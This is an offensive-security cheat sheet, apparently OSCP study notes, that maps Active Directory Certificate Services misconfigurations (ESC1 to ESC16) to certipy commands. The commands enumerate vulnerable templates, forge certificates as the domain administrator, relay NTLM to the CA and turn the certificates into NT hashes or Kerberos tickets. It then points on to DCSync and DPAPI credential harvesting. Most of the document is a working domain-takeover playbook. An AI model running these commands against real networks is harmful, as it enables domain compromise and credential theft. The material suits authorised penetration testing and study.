# ADCS ESC reference

The ESC family at a glance — the working commands per technique live in :Pb adcs; this card maps the misconfig to the move.

## Map the CA first
certipy find -u '<User>@<Domain>' -p '<Password>' -dc-ip <DCIP> -vulnerable -stdout
- [ ] Every [!] line = an ESC + the template/CA it hangs on; v5 says WHY and which group lets me enrol
- [ ] CA name, template name, CA host all noted exactly as printed

## Template-side (I just enrol or rewrite)
- [ ] ESC1 (supply SAN + client auth): request with -upn administrator@<Domain>; patched DC wants -sid '<DomainSID>-500'
- [ ] ESC2 (any purpose): same request, cert does anything
- [ ] ESC3 (enrolment agent): agent cert first, then -on-behalf-of '<Domain>\administrator' -pfx agent.pfx
- [ ] ESC4 (I can write the template): -write-default-configuration (with -save-configuration), request as ESC1, RESTORE the template
- [ ] ESC13 (issuance policy → privileged group): enrol normally, the group's power rides in the cert
- [ ] ESC14 (altSecurityIdentities mapping): write the mapping onto the victim, enrol as them

## CA-side
- [ ] ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2): ANY template takes -upn → request as ESC1
- [ ] ESC7 (ManageCA): -add-officer myself, -enable-template, approve my own pending request
- [ ] ESC16 (SID extension disabled CA-wide): any template behaves like ESC1 — control a UPN (GenericWrite) and enrol
- [ ] ESC9/10 (weak mapping): GenericWrite over a victim → set its UPN to the target, request, set it BACK

## Relay-side
- [ ] Not on the OSCP exam: relay and coercion are kept out as a safe reading; OffSec's pages do not name them
- [ ] ESC8 (HTTP enrolment): coerce DC$ → relay to http://<CA>/certsrv → DC cert: :Pb ntlm-relay
- [ ] ESC11 (RPC enrolment, no packet privacy): certipy relay -target 'rpc://<CAHost>' -ca '<CA>'

## Cash the cert in
certipy auth -pfx administrator.pfx -dc-ip <DCIP>
- [ ] Prints the NT hash + writes a TGT — pass-the-hash or KRB5CCNAME
- [ ] KDC_ERR_PADATA_TYPE_NOSUPP (no PKINIT): certipy auth -pfx administrator.pfx -dc-ip <DCIP> -ldap-shell
- [ ] KRB_AP_ERR_SKEW: sudo ntpdate <DCIP> again, right before the request

## Reality checks
- [ ] Sept-2025+ DCs: strong cert mapping always on — name-only certs rejected; ESC9/16 need a real SID or an ESC6 CA in play
- [ ] certipy v5: -debug goes BEFORE the subcommand; `account` and `shadow` subcommands handle UPN rewrites and shadow creds

## Clean up and next
- [ ] ESC4 template restored, ESC7 officer removed, ESC9/16 UPN put back
- [ ] DA-level win → :Pb acl-abuse for DCSync, then :Pb dpapi for the saved-cred harvest
